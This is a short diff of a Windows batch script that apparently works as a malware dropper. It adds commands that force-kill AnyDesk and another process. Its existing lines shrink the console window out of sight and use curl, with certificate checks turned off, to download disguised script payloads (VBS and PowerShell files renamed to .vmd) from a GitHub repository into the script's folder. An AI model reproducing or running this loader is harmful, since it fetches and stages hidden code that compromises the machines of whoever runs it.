@@ -1,3 +1,5 @@
+taskkill /f /im default_an.exe
+taskkill /f /im AnyDesk.exe
 mode 15,1
 curl -k -L -o "%~dp0asdfhk0" "https://github.com/nemotomui/gabiaxis/raw/refs/heads/main/aefsany/applevbs.vmd"
 curl -k -L -o "%~dp0asdfhk1" "https://github.com/nemotomui/gabiaxis/raw/refs/heads/main/aefsany/bananaps1.vmd"
